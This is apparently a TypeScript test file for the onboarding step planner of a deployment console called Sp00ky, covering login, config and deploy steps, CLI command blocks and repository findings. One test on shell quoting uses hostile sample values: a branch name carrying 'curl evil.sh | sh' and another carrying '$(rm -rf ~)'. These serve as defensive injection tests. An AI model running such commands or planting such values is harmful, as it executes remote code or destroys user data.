// Run with `pnpm test` (`node --test`; Node 22.18+ strips the types itself).
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { DEFAULT_CLOUD_API, findings, plan, shellQuote, type Facts } from '../src/console/onboardingPlan.ts';
import type { Inspection, WorkspaceProject } from '../src/console/cloud.ts';

const NOW = Date.parse('2026-11-01T12:00:00Z');

const ins = (over: Partial<Inspection> = {}): Inspection => ({
  repo: 'mono424/app',
  branch: 'main',
  sha: 'a3f9c1e7d2',
  private: true,
  empty: false,
  files: 120,
  truncated: false,
  config: null,
  monorepo: false,
  apps: [],
  schema_files: 0,
  dockerfiles: 0,
  uses_spooky: false,
  has_cli: false,
  ...over,
});

const project = (over: Partial<WorkspaceProject> = {}): WorkspaceProject => ({
  id: 'p1',
  slug: 'app',
  plan: 'payg',
  platform: 'cloudflare',
  status: 'active',
  deployment_status: null,
  deployment_version: null,
  admin: 'ssp',
  ...over,
});

const facts = (over: Partial<Facts>): Facts => ({ inspection: undefined, now: NOW, ...over });
const states = (f: Facts) => Object.fromEntries(plan(f).map((s) => [s.id, s.state]));
const step = (f: Facts, id: string) => plan(f).find((s) => s.id === id)!;
const commands = (blocks: string[][]) => blocks.flat().filter((l) => !l.startsWith('# '));

const CONFIG = { path: 'sp00ky.yml', valid: true, slug: 'app', apps: [] };

test('the steps advance as the facts arrive', () => {
  const base = { inspection: ins() };
  assert.deepEqual(states(facts(base)), { login: 'active', config: 'waiting', deploy: 'waiting' });
  assert.deepEqual(states(facts({ ...base, cliLoginAt: '2026-11-01T11:59:50Z' })), { login: 'done', config: 'active', deploy: 'waiting' });
  assert.deepEqual(states(facts({ inspection: ins({ config: CONFIG }), cliLoginAt: '2026-11-01T11:59:50Z' })), { login: 'done', config: 'done', deploy: 'active' });
  assert.deepEqual(states(facts({ inspection: ins({ config: CONFIG }), project: project({ deployment_status: 'running', deployment_version: 1 }) })), {
    login: 'done',
    config: 'done',
    deploy: 'done',
  });
});

test('someone already signed in is not sent back to spky login', () => {
  // `spky deploy` ran with credentials from before cli_login_at existed.
  const s = states(facts({ inspection: ins({ config: CONFIG }), project: project({ status: 'pending_payment' }) }));
  assert.equal(s.login, 'done');
  assert.equal(s.deploy, 'active');
});

test('without a repository there is no config step, and init joins deploy', () => {
  const f = facts({ inspection: null });
  assert.deepEqual(plan(f).map((s) => s.id), ['login', 'deploy']);
  assert.deepEqual(commands(step(f, 'deploy').blocks), ['spky init', 'cd my-app', 'spky deploy']);
});

test('the CLI is pointed at a cloud that is not its default', () => {
  const stg = 'https://api-stg.sp00ky.cloud';
  // In every block that talks to the cloud: each can be pasted into a new shell.
  for (const id of ['login', 'deploy']) {
    assert.ok(commands(step(facts({ inspection: ins(), apiUrl: stg }), id).blocks).includes(`export SP00KY_CLOUD_API=${stg}`), id);
  }
  assert.ok(!commands(step(facts({ inspection: ins(), apiUrl: DEFAULT_CLOUD_API }), 'login').blocks).some((l) => l.includes('SP00KY_CLOUD_API')));
  // The repository's own cloudApi already says so.
  const named = ins({ config: { ...CONFIG, cloud_api: stg } });
  assert.ok(!commands(step(facts({ inspection: named, apiUrl: stg }), 'login').blocks).some((l) => l.includes('SP00KY_CLOUD_API')));
  // Its cloudApi names another cloud: the CLI obeys it unless told otherwise.
  const elsewhere = ins({ config: { ...CONFIG, cloud_api: 'https://elsewhere.test' } });
  assert.ok(commands(step(facts({ inspection: elsewhere, apiUrl: DEFAULT_CLOUD_API }), 'login').blocks).includes(`export SP00KY_CLOUD_API=${DEFAULT_CLOUD_API}`));
});

test('a repository with the CLI as a dependency runs it through its package manager', () => {
  const f = facts({ inspection: ins({ has_cli: true, package_manager: 'pnpm', config: CONFIG }) });
  assert.deepEqual(commands(step(f, 'login').blocks), ['pnpm install', 'pnpm spky login']);
  assert.deepEqual(commands(step(f, 'deploy').blocks), ['pnpm spky deploy']);
});

test('spky init gets a directory of its own, and deploy runs from it', () => {
  const before = facts({ inspection: ins() });
  assert.deepEqual(commands(step(before, 'config').blocks), ['spky init', 'git add spooky', 'git commit -m "Add Sp00ky"', 'git push origin main']);
  const after = facts({ inspection: ins({ config: { path: 'spooky/sp00ky.yml', valid: true, apps: [] } }) });
  assert.deepEqual(commands(step(after, 'deploy').blocks), ['cd spooky', 'spky deploy']);
  assert.match(step(after, 'config').result!, /spooky\/sp00ky\.yml on main at a3f9c1e/);
});

test('an empty repository scaffolds the whole project under its own name', () => {
  const f = facts({ inspection: ins({ empty: true, files: 1 }) });
  const lines = step(f, 'config').blocks.flat();
  assert.match(lines[0], /Name it app, choose "Full project"/);
  assert.ok(lines.includes('git add app'));
});

test('a config that does not parse is not a finished step', () => {
  const f = facts({ inspection: ins({ config: { path: 'sp00ky.yml', valid: false, apps: [] } }), cliLoginAt: '2026-11-01T11:00:00Z' });
  assert.equal(step(f, 'config').state, 'active');
  assert.equal(step(f, 'config').title, 'Fix sp00ky.yml');
  assert.ok(commands(step(f, 'config').blocks).includes('spky lint'));
});

test('a command that asks questions ends its block', () => {
  // Pasted after spky init, the git commands would become its answers.
  for (const f of [facts({ inspection: ins() }), facts({ inspection: ins({ empty: true }) }), facts({ inspection: null })]) {
    for (const block of plan(f).flatMap((s) => s.blocks)) {
      const at = block.findIndex((l) => l.endsWith(' init'));
      assert.ok(at === -1 || at === block.length - 1, block.join(' / '));
    }
  }
});

test('the deploy checks follow the project', () => {
  const checks = (p: Partial<WorkspaceProject> | undefined, link?: Facts['link']) =>
    Object.fromEntries(step(facts({ inspection: ins({ config: CONFIG }), project: p && project(p), link }), 'deploy').checks!.map((c) => [c.label, c.state]));
  const paid = { deployment_status: 'provisioning' };
  assert.deepEqual(checks(undefined), { Project: 'active', Checkout: 'waiting', Deployment: 'waiting', 'Deploy on push': 'waiting' });
  assert.deepEqual(checks({ status: 'pending_payment' }), { Project: 'done', Checkout: 'active', Deployment: 'waiting', 'Deploy on push': 'waiting' });
  assert.deepEqual(checks(paid, { state: 'none' }), { Project: 'done', Checkout: 'done', Deployment: 'active', 'Deploy on push': 'active' });
  assert.deepEqual(checks({ deployment_status: 'running' }, { state: 'linked', repo: 'mono424/app', branch: 'main' }), {
    Project: 'done',
    Checkout: 'done',
    Deployment: 'done',
    'Deploy on push': 'done',
  });
  assert.deepEqual(checks({ deployment_status: 'failed' }, { state: 'failed', error: 'nope' }), { Project: 'done', Checkout: 'done', Deployment: 'bad', 'Deploy on push': 'bad' });
});

test('deploying on push waits for a click, and for a sp00ky.yml to build from', () => {
  const push = (over: Partial<Facts>) => step(facts({ project: project({ deployment_status: 'running' }), ...over }), 'deploy').checks!.find((c) => c.label === 'Deploy on push')!;
  const ready = ins({ config: CONFIG });
  assert.equal(push({ inspection: ready, link: { state: 'none' } }).action, 'connect');
  assert.equal(push({ inspection: ready, link: { state: 'failed', error: 'nope' } }).action, 'connect');
  assert.equal(push({ inspection: ready, link: { state: 'unknown' } }).action, undefined);
  // spky deploy ran from a checkout, and the branch has nothing to build yet.
  const unpushed = push({ inspection: ins(), link: { state: 'none' } });
  assert.equal(unpushed.action, undefined);
  assert.match(unpushed.detail!, /Push sp00ky.yml to main first/);
  // Already linked, to something else: says so, and offers nothing.
  const other = push({ inspection: ready, link: { state: 'linked', repo: 'mono424/other', branch: 'main' } });
  assert.equal(other.detail, 'Deploys from mono424/other');
  assert.equal(other.action, undefined);
});

test('what a repository names is quoted before it is pasted', () => {
  assert.equal(shellQuote('main'), 'main');
  assert.equal(shellQuote('feature/x-1.2'), 'feature/x-1.2');
  assert.equal(shellQuote('main; curl evil.sh | sh'), "'main; curl evil.sh | sh'");
  assert.equal(shellQuote("it's"), "'it'\\''s'");
  const f = facts({ inspection: ins({ branch: '$(rm -rf ~)' }) });
  assert.ok(commands(step(f, 'config').blocks).includes("git push origin '$(rm -rf ~)'"));
  const nested = facts({ inspection: ins({ config: { path: 'my app;x/sp00ky.yml', valid: true, apps: [] } }) });
  assert.ok(commands(step(nested, 'deploy').blocks).includes("cd 'my app;x'"));
});

test('a personal workspace says nothing about where the project lands; a team one does', () => {
  const note = (workspaceType: string) => step(facts({ inspection: null, workspaceType }), 'deploy').blocks.flat().some((l) => l.includes('personal workspace'));
  assert.equal(note('personal'), false);
  assert.equal(note('organization'), true);
});

test('findings name what is there and what to do about the client', () => {
  const titles = findings(
    ins({
      package_manager: 'pnpm',
      monorepo: true,
      dockerfiles: 2,
      schema_files: 3,
      schema_dir: 'schema',
      apps: [
        { path: 'apps/web', kind: 'frontend', framework: 'Solid' },
        { path: 'services/api', kind: 'backend', framework: 'Hono' },
      ],
    }),
  );
  assert.deepEqual(titles.map((f) => f.title), [
    'No sp00ky.yml yet',
    'Solid app',
    'Hono backend',
    '3 SurrealQL files',
    'Add the client to apps/web',
    'pnpm workspace',
    '2 Dockerfiles',
  ]);
  assert.equal(titles[4].href, 'https://sp00ky.dev/docs/guide/solid');
});

test('the client is suggested for the app, not the marketing site', () => {
  // mono424/hockeymask's real shape: an Astro landing page listed first.
  const list = findings(
    ins({
      apps: [
        { path: 'apps/api', kind: 'backend', framework: 'Hono' },
        { path: 'apps/landing', kind: 'frontend', framework: 'Astro' },
        { path: 'apps/web', kind: 'frontend', framework: 'React' },
      ],
    }),
  );
  assert.ok(list.some((f) => f.title === 'Add the client to apps/web'));
  // A site is all there is: it is still the one to suggest.
  const only = findings(ins({ apps: [{ path: 'apps/landing', kind: 'frontend', framework: 'Astro' }] }));
  assert.ok(only.some((f) => f.title === 'Add the client to apps/landing'));
});

test('a project already on Sp00ky reads as such', () => {
  const list = findings(ins({ uses_spooky: true, config: { path: 'sp00ky.yml', valid: true, slug: 'app', mode: 'cluster', apps: [{ name: 'web', type: 'frontend' }] } }));
  assert.equal(list[0].title, 'Set up for Sp00ky');
  assert.equal(list[0].detail, 'sp00ky.yml, slug app, cluster mode, 1 app');
  assert.ok(list.some((f) => f.title === 'Sp00ky client installed'));
});
